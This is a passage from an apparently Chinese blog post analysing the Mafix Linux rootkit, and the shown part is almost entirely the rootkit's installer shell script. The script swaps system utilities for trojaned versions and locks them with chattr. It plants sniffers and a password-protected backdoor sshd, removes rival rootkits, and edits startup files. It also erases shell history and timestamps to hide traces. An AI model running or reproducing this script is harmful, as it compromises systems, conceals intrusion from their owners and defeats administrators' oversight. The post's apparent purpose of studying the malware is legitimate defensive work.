&nbsp;mv -f dir /usr/bin/dir 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/dir</p><p>fi</p><p>&nbsp;</p><p># lsof ...</p><p>if [ -f /usr/sbin/lsof ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/lsof</p><p>&nbsp; &nbsp;cp /usr/sbin/lsof $BACKUP</p><p>&nbsp; &nbsp;mv -f lsof /usr/sbin/lsof 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/sbin/lsof</p><p>fi</p><p>&nbsp;</p><p># pstree ...</p><p>if [ -f /usr/bin/pstree ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/pstree</p><p>&nbsp; &nbsp;cp /usr/bin/pstree $BACKUP</p><p>&nbsp; &nbsp;mv -f pstree /usr/bin/pstree 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/pstree</p><p>fi</p><p>&nbsp;</p><p># md5sum ...</p><p>chattr -isa /usr/bin/md5sum</p><p>cp /usr/bin/md5sum $BACKUP</p><p>mv -f md5sum /usr/bin/md5sum 2&gt;/dev/null</p><p>chattr +isa /usr/bin/md5sum</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} backdoored some daemons (netstat, ps)${RES}&quot;</p><p>&nbsp;</p><p>cd $BASEDIR</p><p>&nbsp;</p><p>mkdir $HOMEDIR/.sniff 2&gt;/dev/null</p><p>mv $BASEDIR/bin/shsniff $HOMEDIR/.sniff/shsniff 2&gt;/dev/null</p><p>chmod +x $BASEDIR/bin/sshd 2&gt;/dev/null</p><p>mv $BASEDIR/bin/shp $HOMEDIR/.sniff/shp 2&gt;/dev/null</p><p>mv $BASEDIR/bin/shsb $HOMEDIR/shsb 2&gt;/dev/null</p><p>mv $BASEDIR/bin/hide $HOMEDIR/hide 2&gt;/dev/null</p><p>touch -acmr /bin/ls $HOMEDIR/.sniff/shsniff</p><p>touch -acmr /bin/ls $HOMEDIR/.sniff/shp</p><p>touch -acmr /bin/ls $HOMEDIR/shsb</p><p>touch -acmr /bin/ls $HOMEDIR/hide</p><p>chmod +x $HOMEDIR/.sniff/* 2&gt;/dev/null</p><p>chmod +x $HOMEDIR/shsb 2&gt;/dev/null</p><p>chmod +x $HOMEDIR/hide 2&gt;/dev/null</p><p>./bin/sshd $1 $2 &gt;&gt; /dev/null</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} checking for some vuln daemons....${RES}&quot;</p><p>ps aux &gt; /tmp/.procs</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.procs | grep named`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} NAMED FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/wu.ftpd ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} WU-FTPD FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.procs | grep smbd`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} SAMBA FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.procs | grep rpc.statd`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} RPC.STATD FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>rm -rf /tmp/.procs</p><p>&nbsp;</p><p>netstat -natp &gt; /tmp/.stats</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.stats | grep 443 | grep http`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} MOD_SSL FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>rm -rf /tmp/.stats</p><p>&nbsp;</p><p>&nbsp;</p><p># CHECKING FOR HOSTILE ROOTKITS/BACKDORS</p><p>&nbsp;</p><p>&nbsp;</p><p>mkdir $HOMEDIR/.owned 2&gt;/dev/null</p><p>&nbsp;</p><p>if [ -f /etc/ttyhash ]; then</p><p>&nbsp; &nbsp;chattr -AacdisSu /etc/ttyhash</p><p>&nbsp; &nbsp;rm -rf /etc/ttyhash</p><p>fi</p><p>&nbsp;</p><p>if [ -d /lib/ldd.so ]; then</p><p>&nbsp; &nbsp;chattr -isa /lib/ldd.so</p><p>&nbsp; &nbsp;chattr -isa /lib/ldd.so/*</p><p>&nbsp; &nbsp;mv /lib/ldd.so $HOMEDIR/.owned/tk8</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} tk8 found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/src/.puta ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/src/.puta</p><p>&nbsp; &nbsp;chattr -isa /usr/src/.puta/*</p><p>&nbsp; &nbsp;mv /usr/src/.puta $HOMEDIR/.owned/tk7</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} tk7 found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/xntpd ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/xntpd</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/xntpd</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/nscd ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/nscd</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/nscd</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/include/bex ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/info/termcap.info-5.gz; rm -rf /usr/info/termcap.info-5.gz</p><p>&nbsp; &nbsp;chattr -isa /usr/include/audit.h; rm -rf /usr/include/audit.h</p><p>&nbsp; &nbsp;chattr -isa /usr/include/bex</p><p>&nbsp; &nbsp;chattr -isa /usr/include/bex/*</p><p>&nbsp; &nbsp;mv /usr/include/bex/ $HOMEDIR/.owned/bex2</p><p>&nbsp; &nbsp;if [ -f /var/log/tcp.log ]; then</p><p>&nbsp; &nbsp; &nbsp; chattr -isa /var/log/tcp.log</p><p>&nbsp; &nbsp; &nbsp; cp /var/log/tcp.log $HOMEDIR/.owned/bex2/snifflog</p><p>&nbsp; &nbsp;fi</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/sshd2 &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /usr/bin/sshd2 &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} bex2 found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -d /dev/tux/ ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/xsf &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /usr/bin/xsf &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/xchk &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /usr/bin/xchk &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;chattr -isa /dev/tux &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;mv /dev/tux $HOMEDIR/.owned/tuxkit</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} tuxkit found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/bin/ssh2d ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/ssh2d</p><p>&nbsp; &nbsp;rm -rf /usr/bin/ssh2d</p><p>&nbsp; &nbsp;chattr -isa /lib/security/.config/</p><p>&nbsp; &nbsp;chattr -isa /lib/security/.config/*</p><p>&nbsp; &nbsp;rm -rf /lib/security/.config</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} optickit found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /etc/ld.so.hash ]; then</p><p>&nbsp; &nbsp;chattr -isa /etc/ld.so.hash</p><p>&nbsp; &nbsp;rm -rf /etc/ld.so.hash</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p>chattr +isa /usr/lib/libsh</p><p>chattr +isa /lib/libsh.so</p><p>&nbsp;</p><p># GREPPING SHITZ FROM rc.sysinit and inetd.conf</p><p>&nbsp;</p><p>if [ -f /etc/rc.d/rc.sysinit ]; then</p><p>&nbsp; &nbsp;chattr -isa /etc/rc.d/rc.sysinit</p><p>&nbsp; &nbsp;cat /etc/rc.d/rc.sysinit | grep -v &quot;# Xntps (NTPv3 daemon) startup..&quot;| grep -v &quot;/us
+r/sbin/xntps&quot;| grep -v &quot;/usr/sbin/nscd&quot; &gt; /tmp/.grep</p><p>&nbsp; &nbsp;chmod +x /tmp/.grep</p><p>&nbsp; &nbsp;touch -acmr /etc/rc.d/rc.sysinit /tmp/.grep</p><p>&nbsp; &nbsp;mv -f /tmp/.grep /etc/rc.d/rc.sysinit</p><p>&nbsp; &nbsp;rm -rf /tmp/.grep</p><p>fi</p><p>&nbsp;</p><p>if [ -f /etc/inetd.conf ]; then</p><p>&nbsp; &nbsp;chattr -isa /etc/inetd.conf</p><p>&nbsp; &nbsp;cat /etc/inetd.conf | grep -v &quot;6635&quot;| grep -v &quot;9705&quot; &gt; /tmp/.grep</p><p>&nbsp; &nbsp;touch -acmr /etc/inted.conf /tmp/.grep</p><p>&nbsp; &nbsp;mv -f /tmp/.grep /etc/inetd.conf</p><p>&nbsp; &nbsp;rm -rf /tmp/.grep</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p># KILLING SOME LAMME DAEMONS</p><p>&nbsp;</p><p>killall -9 -q nscd &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q xntps &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q mountd &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q mserv &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q psybnc &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q t0rns &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q linsniffer &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sniffer &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q lpsched &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sniff &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sn1f &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sshd2 &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q xsf &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q xchk &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q ssh2d &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} sysinfo:${RES}&quot;</p><p>MYIPADDR=`/sbin/ifconfig eth0 | grep &quot;inet addr:&quot; | awk -F ' ' ' {print $2} ' | cut -c6-`</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; hostname :${CYN} `hostname -f` ($MYIPADDR)${RES}&quot;</p><p>uname -a | awk '{ print &nbsp;$11 }' &gt;/tmp/info_tmp</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; arch: ${CYN}`cat /tmp/info_tmp` -+- bogomips : `cat /proc/cpuinfo | grep bogomips | awk ' {print $3}'` '${RES}&quot;</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; alternative ip: ${CYN} &quot;`hostname -i`&quot; -+- &nbsp;Might be [&quot;`/sbin/ifconfig | grep eth | wc -l`&quot; ] active adapters.${RES}&quot;</p><p>&nbsp;</p><p>if [ -f /etc/redhat-release ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/redhat-release`${RES}&quot;</p><p>elif [ -f /etc/slackware-version ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/slackware-version`${RES}&quot;</p><p>elif [ -f /etc/debian_version ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/debian_version`${RES}&quot;</p><p>elif [ -f /etc/SuSE-release ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/SuSE-release`${RES}&quot;</p><p>elif [ -f /etc/issue ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/issue`${RES}&quot;</p><p>else echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} unknown${RES}&quot;</p><p>fi</p><p>echo</p><p>echo -n &quot;${CYN}mafix!${DMAG} &gt; cleaning up some traces... ${RES}&quot;</p><p>unset HISTFILE;unset HISTSIZE;unset HISTORY;unset HISTSAVE;unset HISTFILESIZE</p><p>if [ -f /.bash_history ]; then</p><p>&nbsp; &nbsp;chattr -isa /.bash_history &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /.bash_history</p><p>fi</p><p>&nbsp;</p><p>if [ -f /bin/.bash_history ]; then</p><p>&nbsp; &nbsp;chattr -isa /bin/.bash_history</p><p>&nbsp; &nbsp;rm -rf /bin/.bash_history</p><p>fi</p><p>cd $BASEDIR</p><p>rm -rf /tmp/.r*</p><p>cd ..</p><p>rm -rf mafix*</p><p>echo -n &quot;${CYN}done!${RES}&quot;</p><p>echo</p><p>rm -rf /tmp/info_tmp</p><p>endtime=`date +%S`</p><p>echo</p><p>echo</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; /__/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; ${DMAG} &nbsp; ___ &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; /__/| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:: &nbsp; &nbsp; &nbsp; / &nbsp;/:: &nbsp; &nbsp; &nbsp; / &nbsp;/:/_ &nbsp;${DMAG} &nbsp;/ &nbsp;/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:|: &nbsp; &nbsp; / &nbsp;/:/: &nbsp; &nbsp; / &nbsp;/:/ / ${DMAG} / &nbsp;/:/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;__|__|:|: &nbsp; / &nbsp;/:/~/:: &nbsp; / &nbsp;/:/ /:/ ${DMAG}/__/:: &nbsp; &nbsp;${CYN} &nbsp;__|__|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} /__/::::| : /__/:/ /:/: /__/:/ /:/ &nbsp;${DMAG}__/:__ ${CYN} /__/::::____${RES}&quot;</p><p>echo &quot;${CYN}  &nbsp;:~~__/  &nbsp;:/:/__/  &nbsp;:/:/ &nbsp; ${DMAG} &nbsp;  &nbsp;:/ ${CYN} &nbsp; ~~~::::/${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;::/ &nbsp; &nbsp; &nbsp;  &nbsp;::/ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;__::/${CYN} &nbsp; &nbsp; |~~|:|~~ ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;  &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;/__/:/ ${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; ${DMAG} &nbsp; &nbsp;__/ &nbsp;${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; ${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; |__|/ &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${DMAG}${RES}&quot;</p><p>echo &quot;${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Password: $1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${DMAG} &nbsp;  &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Port: $2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;${RES}&quot;</p><p>&nbsp;</p><p>if [ -f /usr/sbin/syslogd ]; then</p><p>&nbsp; &nbsp;/usr/sbin/syslogd -m 0</p><p>else</p><p>&nbsp; &nbsp;/sbin/syslogd -m 0</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/inetd ]; then</p><p>&nbsp; &nbsp;killall -HUP inetd &gt;/dev/null 2&gt;&amp;1</p><p>elif [ -f /usr/sbin/xinetd ]; then</p><p>&nbsp; &nbsp;killall -HUP xinetd</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p></p>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://key1088.github.io/2011/06/28/MAFIX---Linux-2.6-rootkit%E5%88%86%E6%9E%90/" data-id="cm6ae6bjn00f37cwieliy7ujp" data-title="MAFIX - Linux 2.6 rootkit分析" class="article-share-link">Teilen</a>
+      
+      
+        <a href="/2011/06/28/MAFIX---Linux-2.6-rootkit%E5%88%86%E6%9E%90/#comments" class="article-comment-link">
+          <span class="post-comments-count valine-comment-count" data-xid="/2011/06/28/MAFIX---Linux-2.6-rootkit%E5%88%86%E6%9E%90/" itemprop="commentCount"></span>
+          Kommentare
+        </a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2011/07/01/find-%E6%9F%A5%E5%88%B0%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Neuer</strong>
+      <div class="article-nav-title">
+        
+          find 查到隐藏文件
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2011/06/27/Linux%E4%B8%8Brootkit-ddrk%E6%94%BB%E5%87%BB%E8%8E%B7%E5%BE%97root%E6%9D%83%E9%99%90%E4%BB%A5%E5%8F%8A%E6%B8%85%E9%99%A4%E6%96%B9%E6%B3%95%5B%E8%BD%AC%5D/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Älter</strong>
+      <div class="article-nav-title">Linux下rootkit-ddrk攻击获得root权限以及清除方法[转]</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+  <section id="comments" class="vcomment">
+
+  </section>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Kategorien</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/C%E7%BC%96%E7%A8%8B/">C编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/C%E7%BC%96%E7%A8%8B/">C编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/Shell%E7%BC%96%E7%A8%8B/">Shell编程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/">Mysql</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Mysql/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Oracle/">Oracle</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Oracle/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Perl%E7%BC%96%E7%A8%8B/">Perl编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Php%E7%BC%96%E7%A8%8B/">Php编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Shell%E7%BC%96%E7%A8%8B/">Shell编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Windows/">Windows</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Windows/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux/">Linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux/%E5%AE%B9%E5%99%A8/">容器</a></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6/">版本控制</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%94%9F%E6%B4%BB%E6%84%9F%E6%83%B3/">生活感想</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/">程序设计</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/C%E7%BC%96%E7%A8%8B/">C编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/Linux/">Linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/Linux/C%E7%BC%96%E7%A8%8B/">C编程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/Php%E7%BC%96%E7%A8%8B/">Php编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/Python%E7%BC%96%E7%A8%8B/">Python编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/Shell%E7%BC%96%E7%A8%8B/">Shell编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/C%E7%BC%96%E7%A8%8B/">C编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux/">Linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux/C%E7%BC%96%E7%A8%8B/">C编程</a></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Linux/">Linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Linux/C%E7%BC%96%E7%A8%8B/">C编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Linux/Shell%E7%BC%96%E7%A8%8B/">Shell编程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Shell%E7%BC%96%E7%A8%8B/">Shell编程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/">网络工程</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/Php%E7%BC%96%E7%A8%8B/">Php编程</a></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AI/" rel="tag">AI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-dbx/" rel="tag">C;dbx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ChatGPT/" rel="tag">ChatGPT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LLaMA/" rel="tag">LLaMA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MD5-CTX/" rel="tag">MD5_CTX</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/alarm/" rel="tag">alarm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/backup/" rel="tag">backup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fseek/" rel="tag">fseek</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftell/" rel="tag">ftell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gethostbyname/" rel="tag">gethostbyname</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/" rel="tag">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jmp-buf/" rel="tag">jmp_buf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E5%BD%95%E9%9F%B3/" rel="tag">linux录音</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/longjmp/" rel="tag">longjmp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mimikatz/" rel="tag">mimikatz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/minikube/" rel="tag">minikube</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx-%E8%84%9A%E6%9C%AC/" rel="tag">nginx;脚本</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openshift/" rel="tag">openshift</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/openssl/" rel="tag">openssl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/paas/" rel="tag">paas</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/proxy/" rel="tag">proxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qsort/" rel="tag">qsort</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/setjmp/" rel="tag">setjmp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss-easyxss/" rel="tag">xss;easyxss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/" rel="tag">云计算</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%91%E9%9C%89%E6%B4%BE/" rel="tag">树霉派</a></li><li class="tag-list-item"><a class="tag-list-link" 